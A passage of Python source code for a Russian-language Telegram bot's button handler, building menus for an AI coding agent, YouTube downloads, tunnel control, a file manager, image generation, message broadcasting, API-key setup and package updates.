            "• 📁 <b>Файлы</b> — <i>покажи мои файлы</i>, <i>что в папке ~/Drug</i>\n"
            "• 🔧 <b>Инструменты</b> — кнопка «Инструменты» внизу\n"
            "• 🎭 <b>Роль</b> — <i>ты эксперт по Python</i>, <i>отвечай как пиратский капитан</i>\n\n"
            "/endchat или кнопка 🔴 чтобы завершить".format(
                config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=chat_control_keyboard(mode='chat'))

    elif action == 'agent_code_start':
        answer_callback(cb_id)
        # Показываем меню выбора действия перед стартом
        edit_message(chat_id, msg_id,
            "💻 <b>Агент-кодер</b> — выбери действие:\n\n"
            "🖊 <b>Написать код</b> — опиши задачу, агент напишет и запустит\n"
            "🔍 <b>Ревью кода</b> — найдёт ошибки и уязвимости\n"
            "🔧 <b>Исправить ошибку</b> — вставь код + traceback\n"
            "📦 <b>Создать проект</b> — многофайловый проект в zip\n"
            "🏖 <b>Sandbox</b> — запусти любой код прямо сейчас\n"
            "🤖 <b>Инструменты бота</b> — агент управляет туннелем, файлами\n"
            "📁 <b>Создать файл</b> — txt/md/csv/docx/zip\n\n"
            "Модель: <b>{} / {}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=kb(
                [btn("🖊 Написать код",       "coder:write"),
                 btn("🔍 Ревью кода",         "coder:review")],
                [btn("🔧 Исправить ошибку",   "coder:fix"),
                 btn("📦 Создать проект",     "coder:project")],
                [btn("🏖 Sandbox",            "coder:sandbox"),
                 btn("🤖 Инструменты бота",   "coder:bot_tools")],
                [btn("📁 Создать файл",       "coder:file"),
                 btn("🎬 YouTube",            "agent_youtube_start")],
                [back_btn("menu_agent")],
            ))

    elif action == 'agent_youtube_start':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'agent_youtube_url'
        edit_message(chat_id, msg_id,
            "🎬 <b>Скачивание с YouTube</b>\n\n"
            "Отправь ссылку на видео — я покажу выбор формата.",
            reply_markup=kb([btn("❌ Отмена", "menu_agent")]))

    elif action == 'yt_fmt':
        # arg = 'mp3' или 'mp4' — пользователь выбрал формат
        answer_callback(cb_id)
        url = _yt_pending_url.pop(chat_id, None)
        if not url:
            edit_message(chat_id, msg_id,
                "❌ URL потерян. Начни заново.",
                reply_markup=kb([btn("🎬 Начать заново", "agent_youtube_start"),
                                 btn("◀️ Меню", "menu_agent")]))
        else:
            fmt  = arg  # 'mp3' или 'mp4'
            task = "скачай {} {}".format(fmt, url)
            icon = '🎵' if fmt == 'mp3' else '🎬'

            edit_message(chat_id, msg_id,
                "{} Скачиваю {}...\n🔗 <code>{}</code>".format(icon, fmt.upper(), url))

            def _st_fmt(m):
                try:
                    edit_message(chat_id, msg_id, m)
                except Exception:
                    send_message(m, chat_id)

            def _do_dl():
                from chat_agent import _run_video_agent
                result = _run_video_agent(chat_id, task, on_status=_st_fmt)
                files  = result.get('files', [])
                title  = result.get('_video_title', '')
                fsize  = result.get('_fsize_mb', 0)

                if files and os.path.exists(files[0]):
                    fpath   = files[0]
                    caption = "{} {} ({:.1f} MB)".format(
                        icon, title or os.path.basename(fpath), fsize)
                    try:
                        send_document(fpath, caption=caption, chat_id=chat_id)
                    except Exception as e:
                        send_message("⚠️ Не удалось отправить: {}".format(e), chat_id)
                    # Туннель для больших файлов
                    try:
                        import fish_bot_state as _fbs
                        turl = (_fbs.tunnel_url or _fbs.bore_url or
                                _fbs.ngrok_url or _fbs.serveo_url)
                        if turl and fsize > 49:
                            send_message(
                                "🌍 Доступен через туннель:\n"
                                "<code>{}/download/{}</code>".format(
                                    turl.rstrip('/'), os.path.basename(fpath)), chat_id)
                    except Exception:
                        pass
                else:
                    full = result.get('_full_output', '❌ Не удалось скачать.')
                    send_message(full, chat_id)

                send_message("✅ Готово", chat_id, reply_markup=kb([
                    btn("🎬 Скачать ещё", "agent_youtube_start"),
                    btn("◀️ Меню агента", "menu_agent"),
                ]))
            _run_in_thread(_do_dl)

    # ── Меню действий агента-кодера ──────────────────────────────────
    elif action == 'coder':
        answer_callback(cb_id)
        mode_map = {
            'write':     ('code',  None,        '🖊 Напиши задачу:'),
            'review':    ('code',  'review',    '🔍 Вставь код для ревью:'),
            'fix':       ('code',  'fix',       '🔧 Вставь код + ошибку:'),
            'project':   ('code',  'plan',      '📦 Опиши проект:'),
            'sandbox':   ('code',  'sandbox',   '🏖 Вставь код для запуска:'),
            'bot_tools': ('code',  'bot_tools', '🤖 Что сделать? (пример: запусти туннель bore)'),
            'file':      ('code',  'file',      '📁 Опиши файл (формат + содержимое):'),
        }
        mode_chat, proj_mode, prompt_text = mode_map.get(arg, ('code', None, 'Опиши задачу:'))
        start_session(chat_id, mode_chat)
        if proj_mode:
            _pending_agent_task[chat_id] = {'proj_mode': proj_mode}
        _wait_state[chat_id] = 'coder_input:' + (proj_mode or 'write')
        send_message(
            "💻 <b>{}</b>\n\n<i>Отправь текст — агент возьмётся за работу.</i>".format(prompt_text),
            chat_id,
            reply_markup=kb([btn("❌ Отмена", "agent_code_start")]))

    # ── Инструменты бота — быстрое меню ──────────────────────────────
    elif action == 'agent_tools_menu':
        answer_callback(cb_id)
        try:
            import fish_bot_state as _fbs
            turl = _fbs.tunnel_url or _fbs.bore_url or _fbs.ngrok_url or _fbs.serveo_url
            srv  = _fbs.server_running
        except Exception:
            turl, srv = None, False
        tunnel_lbl = "🟢 Туннель: активен" if turl else "🔴 Запустить туннель"
        tunnel_act = "tools:tunnel_status" if turl else "tools:tunnel_start"
        edit_message(chat_id, msg_id,
            "🔧 <b>Инструменты бота</b>\n\n"
            "Управление туннелем, страницами и статистикой:",
            reply_markup=kb(
                [btn(tunnel_lbl,                   tunnel_act)],
                [btn("🔴 Стоп туннель",            "tools:tunnel_stop"),
                 btn("📊 Статистика",              "tools:bot_stats")],
                [btn("📄 HTML-страницы",           "tools:list_pages"),
                 btn("🌐 Скачать URL",             "tools:save_html")],
                [btn("📁 Файловый менеджер",       "fm:open:~")],
                [back_btn("menu_agent")],
            ))

    elif action == 'tools':
        answer_callback(cb_id)
        from bot_tools import execute_bot_tool
        def _send(text, cid): send_message(text, cid)
        def _sdoc(path, caption, chat_id): send_document(path, caption=caption, chat_id=chat_id)
        if arg == 'tunnel_start':
            send_message("🚇 Запускаю bore...", chat_id)
            def _do():
                result = execute_bot_tool('tunnel_start bore', chat_id, _send, _sdoc)
                send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
            _run_in_thread(_do)
        elif arg == 'tunnel_stop':
            result = execute_bot_tool('tunnel_stop', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'tunnel_status':
            result = execute_bot_tool('tunnel_status', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'bot_stats':
            result = execute_bot_tool('bot_stats', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'list_pages':
            result = execute_bot_tool('list_pages', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'save_html':
            _wait_state[chat_id] = 'tools_save_html'
            send_message("🌐 Введи URL для скачивания:", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "agent_tools_menu")]))

    # ── Файловый менеджер ──────────────────────────────────────────
    elif action == 'fm':
        answer_callback(cb_id)
        from file_manager import (list_dir, format_listing, list_archive,
                                   is_safe_path, read_file_preview,
                                   delete_path, _size_str)

        # ── Кэш путей: решает BUTTON_DATA_INVALID (лимит 64 байта) ──
        # Вместо полного пути в callback_data храним короткий числовой ключ.
        def _fmc_put(path):
            """Сохраняем путь в кэше, возвращаем короткий ключ вида 'p42'."""
            for k, v in _fm_cache.items():
                if v == path:
                    return k
            key = 'p{}'.format(len(_fm_cache))
            _fm_cache[key] = path
            return key

        def _fmc_get(key):
            """Восстанавливаем путь из кэша. Тильда → HOME напрямую."""
            if key == 'HOME' or key == '~':
                return os.path.expanduser('~')
            return _fm_cache.get(key, os.path.expanduser('~'))

        def _fmbtn(label, sub, path):
            """Кнопка FM с коротким ключом вместо пути."""
            return btn(label, 'fm:{}:{}'.format(sub, _fmc_put(path)))

        # Восстанавливаем путь из аргумента
        if arg == 'open:HOME' or arg == 'open:~' or arg == 'open':
            path = os.path.expanduser('~')
            sub  = 'open'
        else:
            sub, key = (arg + ':p0').split(':', 1)
            key = key.rstrip(':')
            path = _fmc_get(key) if key.startswith('p') or key in ('HOME','~')                    else os.path.expanduser(key) if key.startswith('~')                    else os.path.realpath(key)

        if not is_safe_path(path):
            send_message("🚫 Нет доступа к этому пути.", chat_id)

        elif sub == 'open':
            if os.path.isfile(path):
                sz = _size_str(path)
                parent_path = os.path.dirname(path)
                edit_message(chat_id, msg_id,
                    "📄 <b>{}</b>\n📏 {}\n\nЧто сделать?".format(
                        os.path.basename(path), sz),
                    reply_markup=kb(
                        [_fmbtn("👁 Просмотр",  "view", path),
                         _fmbtn("📤 Отправить", "send", path)],
                        [_fmbtn("🗑 Удалить",   "del_ask", path)],
                        [_fmbtn("◀️ Назад",     "open", parent_path)],
                    ))
            else:
                items, parent, err = list_dir(path)
                if err:
                    send_message(err, chat_id)
                else:
                    listing = format_listing(path, items, parent)
                    rows = []
                    for item in items[:20]:
                        label = "{} {}".format(item['icon'], item['name'])
                        rows.append([_fmbtn(label, "open", item['path'])])
                    if parent:
                        rows.append([_fmbtn("⬆️ Наверх", "open", parent)])
                    rows.append([btn("◀️ Меню", "menu_agent")])
                    edit_message(chat_id, msg_id, listing, reply_markup=kb(*rows))

        elif sub == 'view':
            ext = os.path.splitext(path)[1].lower()
            if ext in ('.zip', '.tar', '.gz', '.bz2', '.xz'):
                result_text = list_archive(path)
            else:
                file_content, note = read_file_preview(path)
                if file_content is None:
                    result_text = note
                else:
                    result_text = "📄 <b>{}</b>\n<pre>{}</pre>".format(
                        os.path.basename(path),
                        file_content[:3500].replace('<','&lt;').replace('>','&gt;'))
                    if note:
                        result_text += "\n<i>{}</i>".format(note)
            send_message(result_text, chat_id,
                reply_markup=kb([_fmbtn("◀️ Назад", "open", os.path.dirname(path))]))

        elif sub == 'send':
            if os.path.exists(path):
                try:
                    send_document(path, caption="📎 " + os.path.basename(path), chat_id=chat_id)
                    send_message("✅ Отправлено", chat_id,
                        reply_markup=kb([_fmbtn("◀️ Назад", "open", os.path.dirname(path))]))
                except Exception as e:
                    send_message("❌ {}".format(e), chat_id)
            else:
                send_message("❌ Файл не найден", chat_id)

        elif sub == 'del_ask':
            kind = "папку" if os.path.isdir(path) else "файл"
            edit_message(chat_id, msg_id,
                "⚠️ <b>Удалить {}?</b>\n<code>{}</code>\n\nЭто действие необратимо!".format(
                    kind, os.path.basename(path)),
                reply_markup=kb(
                    [_fmbtn("✅ Да, удалить", "del_confirm", path),
                     _fmbtn("❌ Отмена",      "open", os.path.dirname(path))],
                ))

        elif sub == 'del_confirm':
            parent_path = os.path.dirname(path)
            ok, msg_del = delete_path(path)
            send_message(msg_del, chat_id,
                reply_markup=kb([_fmbtn("◀️ Назад", "open", parent_path)]))

    # ── Функции чата ───────────────────────────────────────────────
    elif action == 'chat_fn':
        answer_callback(cb_id)
        if arg == 'websearch':
            _wait_state[chat_id] = 'chat_websearch'
            send_message("🌐 Введи поисковый запрос:", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "agent_chat_start")]))
        elif arg == 'persona':
            _wait_state[chat_id] = 'chat_persona'
            send_message(
                "🎭 Введи роль для ИИ:\n\n"
                "Примеры:\n"
                "• <i>Ты опытный Python-разработчик. Отвечай кратко.</i>\n"
                "• <i>Ты пиратский капитан. Говори соответственно.</i>\n"
                "• <i>Ты строгий преподаватель математики.</i>",
                chat_id,
                reply_markup=kb([btn("❌ Отмена", "agent_chat_start")]))

    # ══════════════════════════════════════════════════════════
    #  МЕНЮ ГЕНЕРАЦИИ КАРТИНОК
    # ══════════════════════════════════════════════════════════
    elif action == 'img_size':
        answer_callback(cb_id, "✅ Размер: " + arg)
        _img_settings.setdefault(chat_id, {})['size'] = arg
        send_message(f"✅ Размер: <b>{arg}</b>. Теперь опиши картинку или выбери провайдер.",
                     chat_id, reply_markup=kb([btn("◀️ К генерации", "menu_image")]))

    elif action == 'img_style':
        answer_callback(cb_id, "✅ Стиль выбран")
        _img_settings.setdefault(chat_id, {})['style_suffix'] = arg
        style_name = arg.split(',')[0]
        send_message(f"✅ Стиль: <b>{style_name}</b>. Теперь опиши картинку или выбери провайдер.",
                     chat_id, reply_markup=kb([btn("◀️ К генерации", "menu_image")]))

    elif action == 'menu_image':
        answer_callback(cb_id)
        providers = get_image_providers()
        rows_prov = []
        # Разбиваем провайдеры по 2 в ряд
        prov_btns = []
        for p in providers:
            icon = '✅' if p['available'] else ('🔑' if not p['has_key'] else '❌')
            price = p.get('price', '')
            label = f"{icon} {p['name'].title()}".strip()
            prov_btns.append(btn(label, f"img_gen:{p['name']}"))
        for i in range(0, len(prov_btns), 2):
            rows_prov.append(prov_btns[i:i+2])

        # Текущий размер и стиль
        cur_size  = _img_settings.get(chat_id, {}).get('size',  '1024x1024')
        cur_style = _img_settings.get(chat_id, {}).get('style', '')
        size_lbl  = {'1024x1024': '📐 1:1', '576x1024': '📱 9:16', '1024x576': '🖥 16:9'}.get(cur_size, cur_size)

        info_text = (
            "🎨 <b>Генерация картинок</b>\n\n"
            "Размер: <b>{}</b>  Стиль: <b>{}</b>\n\n"
            "Выбери провайдер и опиши картинку:".format(
                size_lbl, cur_style[:20] or 'авто'))

        edit_message(chat_id, msg_id, info_text,
            reply_markup=kb(
                *rows_prov,
                [btn("⚡ Авто (лучший)",        "img_gen:auto")],
                [btn("📐 1:1",  "img_size:1024x1024"),
                 btn("📱 9:16", "img_size:576x1024"),
                 btn("🖥 16:9", "img_size:1024x576")],
                [btn("🎨 Фото", "img_style:photorealistic, highly detailed, 8k"),
                 btn("🎭 Аниме","img_style:anime style, vibrant"),
                 btn("🖼 Масло","img_style:oil painting, artistic")],
                [btn("🌌 Киберпанк","img_style:cyberpunk, neon, dark city"),
                 btn("🧿 Минимализм","img_style:minimalist, clean, simple")],
                [btn("🔑 Добавить ключ", "img_add_key"),
                 back_btn()],
            ))

    elif action == 'img_gen':
        answer_callback(cb_id)
        if chat_id not in _img_settings: _img_settings[chat_id] = {}
        _img_settings[chat_id]['provider'] = arg
        cur_style = _img_settings.get(chat_id, {}).get('style', '')
        cur_size  = _img_settings.get(chat_id, {}).get('size',  '1024x1024')
        style_hint = f"  Текущий стиль: <i>{cur_style[:30]}</i>" if cur_style else ''
        _wait_state[chat_id] = f'img_prompt:{arg}'
        edit_message(chat_id, msg_id,
            "🎨 <b>Провайдер: {}</b> | {} {}\n\n"
            "Опиши картинку на любом языке:\n\n"
            "Примеры:\n"
            "• <i>кот в космосе, стиль аниме</i>\n"
            "• <i>sunset over mountains, photorealistic</i>\n"
            "• <i>киберпанк город ночью, неон</i>\n"
            "• <i>девушка с катаной, студия Гибли</i>".format(arg, cur_size, style_hint),
            reply_markup=kb([btn("❌ Отмена", "menu_image")]))

    elif action == 'img_add_key':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'img_add_key'
        send_message(
            "🔑 <b>Добавить ключ для генерации картинок:</b>\n\n"
            "Напиши: <code>провайдер ВАШ_КЛЮЧ</code>\n\n"
            "Примеры:\n"
            "• <code>dalle sk-abc123...</code> → DALL-E (OpenAI)\n"
            "• <code>stability sk-abc123...</code> → Stability AI\n"
            "• <code>huggingface hf_abc123...</code> → HuggingFace",
            chat_id, reply_markup=kb([btn("❌ Отмена", "menu_image")]))

    # ══════════════════════════════════════════════════════════
    #  МЕНЮ ОТПРАВКИ СООБЩЕНИЙ
    # ══════════════════════════════════════════════════════════
    elif action == 'menu_send':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "📨 <b>Отправка сообщений</b>\n\nВыбери действие:",
            reply_markup=kb(
                [btn("👤 Пользователю",    "send_to:user"),
                 btn("📢 В канал/группу",  "send_to:channel")],
                [btn("📎 Переслать файл",  "send_to:file"),
                 btn("⏰ Отложить отправку","send_to:schedule")],
                [btn("📋 Запланированные", "send_scheduled"),
                 btn("📣 Рассылка",        "send_to:broadcast")],
                [back_btn()],
            ))

    elif action == 'send_to':
        answer_callback(cb_id)
        prompts = {
            'user':      ("👤 Кому? Введи @username или chat_id:",
                          "send_target:user"),
            'channel':   ("📢 Введи @channel_name или chat_id канала:",
                          "send_target:channel"),
            'file':      ("📎 Введи @username или chat_id получателя:",
                          "send_target:file"),
            'schedule':  ("⏰ Кому отправить? (@username или chat_id):",
                          "send_target:schedule"),
            'broadcast': ("📣 Введи список получателей через запятую:\n"
                          "<code>@user1, @user2, -100123456</code>:",
                          "send_targets:broadcast"),
        }
        text_p, next_state = prompts.get(arg, ("Введи получателя:", "send_target:user"))
        _wait_state[chat_id] = next_state
        send_message(text_p, chat_id, reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif action == 'send_scheduled':
        answer_callback(cb_id)
        tasks = get_scheduled()
        if not tasks:
            send_message("📋 Нет запланированных сообщений.", chat_id,
                         reply_markup=kb([back_btn("menu_send")]))
        else:
            lines = ["📋 <b>Запланированные ({}):</b>".format(len(tasks))]
            now = time.time()
            for t in tasks[:10]:
                wait_sec = max(0, int(t['send_at'] - now))
                lines.append("• {} → через {}с: <i>{}</i>".format(
                    t['target'], wait_sec, t['text'][:40]))
            send_message("\n".join(lines), chat_id,
                         reply_markup=kb([back_btn("menu_send")]))

    # ══════════════════════════════════════════════════════════
    #  ДОБАВЛЕНИЕ API КЛЮЧА (удобный мастер)
    # ══════════════════════════════════════════════════════════
    elif action == 'llm_add_key':
        answer_callback(cb_id)
        # Если arg задан — сразу ждём ввод ключа для конкретного провайдера
        if arg:
            _wait_state[chat_id] = f'llm_key_for:{arg}'
            provider_info = {
                'groq':       ('https://console.groq.com/keys',         '🆓 Бесплатно'),
                'openai':     ('https://platform.openai.com/api-keys',  '💳 Платно'),
                'gemini':     ('https://aistudio.google.com/apikey',    '🆓 Бесплатно'),
                'claude':     ('https://console.anthropic.com/',        '💳 Платно'),
                'openrouter': ('https://openrouter.ai/keys',            '🆓 Есть бесплатные'),
                'cerebras':   ('https://cloud.cerebras.ai',             '🆓 Бесплатно'),
                'sambanova':  ('https://cloud.sambanova.ai',            '🆓 Бесплатно'),
                'together':   ('https://api.together.xyz',              '💳 + триал'),
                'mistral':    ('https://console.mistral.ai/',           '💳 + триал'),
                'deepseek':   ('https://platform.deepseek.com/api-keys','💳 Дёшево'),
                'xai':        ('https://console.x.ai/',                 '💳 Платно'),
            }
            info = provider_info.get(arg, ('', ''))
            reg_url, price = info if info else ('', '')
            send_message(
                f"🔑 <b>Ключ для {arg.upper()}</b>\n\n"
                f"{price}\n"
                + (f"Получить ключ: {reg_url}\n\n" if reg_url else "") +
                f"Просто вставь API ключ сюда 👇",
                chat_id, reply_markup=kb([btn("❌ Отмена", "menu_llm")]))
        else:
            # Общий мастер — выбор провайдера кнопками
            _wait_state[chat_id] = 'llm_add_key'
            send_message(
                "🔑 <b>Добавить API ключ</b>\n\n"
                "Выбери провайдер или напиши: <code>провайдер КЛЮЧ</code>\n\n"
                "Бесплатные (регистрация ~1 мин):",
                chat_id, reply_markup=kb(
                    [btn("⚡ Groq (free)",      "llm_add_key:groq"),
                     btn("💎 Gemini (free)",    "llm_add_key:gemini")],
                    [btn("🌐 OpenRouter (free)","llm_add_key:openrouter"),
                     btn("🧠 Cerebras (free)", "llm_add_key:cerebras")],
                    [btn("🔥 SambaNova (free)", "llm_add_key:sambanova"),
                     btn("🐋 DeepSeek (cheap)", "llm_add_key:deepseek")],
                    [btn("🔵 OpenAI",           "llm_add_key:openai"),
                     btn("🟣 Claude",           "llm_add_key:claude")],
                    [btn("❌ Отмена", "menu_llm")],
                ))

    # ══════════════════════════════════════════════════════════
    #  БЕСПЛАТНЫЕ МОДЕЛИ
    # ══════════════════════════════════════════════════════════
    elif action == 'llm_free':
        answer_callback(cb_id)
        FREE_PROVIDERS = {
            # ── Без регистрации ──────────────────────────────────────────
            '🌸 Pollinations LLM': ('openai', 'openai',
                                'OPENAI_API_KEY', 'https://image.pollinations.ai'),
            # ── Бесплатный ключ за 1 мин ─────────────────────────────────
            '⚡ Groq (70B fast)':   ('groq',       'llama-3.3-70b-versatile',
                                    'GROQ_API_KEY', 'https://console.groq.com/keys'),
            '⚡ Groq DeepSeek R1':  ('groq',       'deepseek-r1-distill-llama-70b',
                                    'GROQ_API_KEY', 'https://console.groq.com/keys'),
            '⚡ Groq Qwen3-32B':    ('groq',       'qwen/qwen3-32b',
                                    'GROQ_API_KEY', 'https://console.groq.com/keys'),
            '💎 Gemini 2.0 Flash':  ('gemini',     'gemini-2.0-flash',
                                    'GEMINI_API_KEY', 'https://aistudio.google.com/apikey'),
            '💎 Gemini 2.5 Flash':  ('gemini',     'gemini-2.5-flash-preview-04-17',
                                    'GEMINI_API_KEY', 'https://aistudio.google.com/apikey'),
            '🌐 OR Llama 3.3 70B':  ('openrouter', 'meta-llama/llama-3.3-70b-instruct:free',
                                    'OPENROUTER_API_KEY', 'https://openrouter.ai/keys'),
            '🌐 OR DeepSeek R1':    ('openrouter', 'deepseek/deepseek-r1:free',
                                    'OPENROUTER_API_KEY', 'https://openrouter.ai/keys'),
            '🌐 OR Qwen3 235B':     ('openrouter', 'qwen/qwen3-235b-a22b:free',
                                    'OPENROUTER_API_KEY', 'https://openrouter.ai/keys'),
            '🧠 Cerebras Llama 70B':('cerebras',   'llama-3.3-70b',
                                    'CEREBRAS_API_KEY', 'https://cloud.cerebras.ai'),
            '🔥 SambaNova 70B':     ('sambanova',  'Meta-Llama-3.3-70B-Instruct',
                                    'SAMBANOVA_API_KEY', 'https://cloud.sambanova.ai'),
        }
        lines = ["🆓 <b>Бесплатные LLM провайдеры:</b>\n"]
        rows = []
        for label, (prov, model, key_attr, reg_url) in FREE_PROVIDERS.items():
            has_key = bool(getattr(config, key_attr, '') or os.environ.get(key_attr, ''))
            status  = "✅ ключ есть" if has_key else "🔑 нужен ключ (бесплатно)"
            lines.append(f"<b>{label}</b>: <code>{model}</code>\n   {status}\n   Регистрация: {reg_url}\n")
            mark = " ✅" if has_key else ""
            rows.append([btn(f"{label}{mark}", f"llm_setmodel:{prov}:{model}")])
        rows.append([btn("🔑 Добавить ключ", "llm_add_key"), back_btn("menu_llm")])
        edit_message(chat_id, msg_id, "\n".join(lines), reply_markup=kb(*rows))

    # ══════════════════════════════════════════════════════════
    #  ОБНОВЛЕНИЕ / ДИАГНОСТИКА
    # ══════════════════════════════════════════════════════════
    elif action == 'menu_update':
        answer_callback(cb_id)
        info = get_bot_info()
        edit_message(chat_id, msg_id,
            format_bot_info(info),
            reply_markup=kb(
                [btn("📦 Зависимости",           "update_check_deps"),
                 btn("⬆️ Обновить всё",          "update_upgrade")],
                [btn("🚀 Авто-исправление",       "update_autofix"),
                 btn("🔧 Установить пакет",       "update_install")],
                [btn("🩺 Самодиагностика",        "update_diag"),
                 btn("🐍 Версии пакетов",         "update_versions")],
                [back_btn()],
            ))

    elif action == 'update_autofix':
        answer_callback(cb_id, "Запускаю авто-исправление...")
        def _do_autofix():
            from updater import check_dependencies, install_package
            deps = check_dependencies()
            missing = [d['name'] for d in deps if not d['installed'] and not d['optional']]
            if not missing:
                send_message("✅ Всё установлено, ничего не нужно исправлять!",
                             chat_id, reply_markup=kb([back_btn("menu_update")]))
                return
            send_message(f"🔧 Устанавливаю {len(missing)} пакетов: {', '.join(missing)}", chat_id)
            results = {'ok': [], 'failed': []}
            for pkg in missing:
                ok, msg_out = install_package(pkg)
                if ok:
                    results['ok'].append(pkg)
                    send_message(f"✅ {pkg} установлен", chat_id)
                else:
                    results['failed'].append(pkg)
                    send_message(f"❌ {pkg}: {msg_out[:100]}", chat_id)
            send_message(
                f"🏁 Готово: ✅ {len(results['ok'])} | ❌ {len(results['failed'])}",
                chat_id, reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_autofix)

    elif action == 'update_versions':
        answer_callback(cb_id, "Читаю список...")
        def _do_vers():
            from updater import get_package_versions, CORE_PACKAGES
            versions = get_package_versions()
            lines = ["📦 <b>Установленные версии:</b>\n"]
            for pkg in CORE_PACKAGES:
                ver = versions.get(pkg.lower()) or versions.get(pkg.lower().replace('-','_')) or '—'
                icon = '✅' if ver != '—' else '❌'
                lines.append(f"{icon} <code>{pkg}</code>: {ver}")
            send_message("\n".join(lines), chat_id,
                         reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_vers)

    elif action == 'update_check_deps':
        answer_callback(cb_id, "Проверяю...")
        def _do_deps():
            deps = check_dependencies()
            report = format_deps_report(deps)
            missing = [d['name'] for d in deps if not d['installed'] and not d['optional']]
            rows = []
            if missing:
                rows.append([btn("⬆️ Установить недостающие", "update_install_missing")])
            rows.append([back_btn("menu_update")])
            send_message(report, chat_id, reply_markup=kb(*rows))
        _run_in_thread(_do_deps)

    elif action == 'update_upgrade':
        answer_callback(cb_id)
        send_message("⬆️ Обновляю пакеты... (может занять минуту)", chat_id)
        def _do_upgrade():
            results = upgrade_core(
                on_progress=lambda pkg, ok, msg:
                    send_message(f"{'✅' if ok else '⏳' if ok is None else '❌'} {pkg}: {msg[:60]}", chat_id)
                    if ok is not None else None
            )
            ok_list  = ', '.join(results['ok']) or '—'
            bad_list = ', '.join(d['pkg'] for d in results['failed']) or '—'
            send_message(
                "✅ Обновлено: <b>{}</b>\n❌ Ошибки: <b>{}</b>".format(ok_list, bad_list),
                chat_id, reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_upgrade)

    elif action == 'update_install':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'update_install_pkg'
        send_message(
            "🔧 Введи название пакета:\n"
            "Примеры:\n"
            "• <code>yt-dlp</code>\n"
            "• <code>openai</code>\n"
            "• <code>python-docx</code>",
            chat_id, reply_markup=kb([btn("❌ Отмена", "menu_update")]))

    elif action == 'update_install_missing':
        answer_callback(cb_id, "Устанавливаю...")
        def _do_install_missing():
            from updater import CORE_PACKAGES, get_package_versions
            installed = get_package_versions()
            missing = [p for p in CORE_PACKAGES
                       if not installed.get(p.lower().replace('-','_'))
                       and not installed.get(p.lower())]
            if not missing:
                send_message("✅ Все core-пакеты уже установлены!", chat_id,
                             reply_markup=kb([back_btn("menu_update")]))
                return
            for pkg in missing:
                send_message(f"📦 Устанавливаю {pkg}...", chat_id)
                ok, msg = install_package(pkg)
                send_message(f"{'✅' if ok else '❌'} {pkg}: {msg[:80]}", chat_id)
            send_message("✅ Готово", chat_id,
                         reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_install_missing)

    elif action == 'update_diag':
        answer_callback(cb_id, "Диагностика...")
        def _do_diag():
            lines = ["🩺 <b>Самодиагностика</b>\n"]
            # Проверка TG токена
            token = config.TELEGRAM_BOT_TOKEN
            lines.append(f"{'✅' if token else '❌'} Telegram токен: {'есть' if token else 'НЕТ!'}")
            # Проверка LLM
            prov = config.LLM_PROVIDER
            key  = config.get_key(prov) if prov != 'ollama' else '(не нужен)'
            lines.append(f"{'✅' if key else '⚠️'} LLM ({prov}): {'ключ есть' if key else 'нет ключа'}")
            # Проверка TTS
            tts = config.TTS_PROVIDER
            lines.append(f"✅ TTS: {tts} / {config.TTS_VOICE}")
            # Проверка Python-версии
            import sys as _sys
            py_ver = _sys.version.split()[0]
            ok_py  = tuple(int(x) for x in py_ver.split('.')[:2]) >= (3, 8)
            lines.append(f"{'✅' if ok_py else '❌'} Python: {py_ver}")
            # Проверка зависимостей
            deps = check_dependencies()
            missing = [d['name'] for d in deps if not d['installed'] and not d['optional']]
            if missing:
                lines.append(f"⚠️ Не установлено: {', '.join(missing)}")
            else:
                lines.append("✅ Все core-зависимости установлены")
            # Проверка .env
            from config import ENV_PATH
            lines.append(f"{'✅' if os.path.exists(ENV_PATH) else '❌'} .env файл: {'найден' if os.path.exists(ENV_PATH) else 'НЕТ!'}")
            # Проверка Flask порта
            try:
                import fish_bot_state as fbs
                lines.append(f"{'🟢' if fbs.server_running else '🔴'} Flask: {'запущен' if fbs.server_running else 'остановлен'}")
            except Exception:
                lines.append("⬜ Flask: неизвестно")
            send_message("\n".join(lines), chat_id,
                         reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_diag)

    elif action == 'llm_all_providers':
        answer_callback(cb_id)
        # Показываем полный список провайдеров постранично
        from llm_checker import PROVIDERS as ALL_PROVS
        all_names = sorted(ALL_PROVS.keys())
        rows = []
        for i in range(0, len(all_names), 3):
            chunk = all_names[i:i+3]
            row = []
            for name in chunk:
                has_key = bool(getattr(config, name.upper() + '_API_KEY', '')
                               or os.environ.get(name.upper() + '_API_KEY', ''))
                mark = " ✅" if has_key else ""
                row.append(btn(f"{name}{mark}", f"llm_info:{name}"))
            rows.append(row)
        rows.append([btn("🔑 Добавить ключ", "llm_add_key"), back_btn("menu_llm")])
        edit_message(chat_id, msg_id,
            f"📋 <b>Все провайдеры ({len(all_names)}):</b>\n✅ = есть ключ",
            reply_markup=kb(*rows))

    elif action == 'llm_pick_current':
        answer_callback(cb_id)
        prov = config.LLM_PROVIDER
        from llm_checker import RECOMMENDED
        models = RECOMMENDED.get(prov, [])
        if not models:
            send_message(f"❌ Нет рекомендованных моделей для {prov}", chat_id,
                         reply_markup=kb([back_btn("menu_llm")]))
        else:
            rows = []
            for m in models[:8]:
                cur = " ✅" if m == config.LLM_MODEL else ""
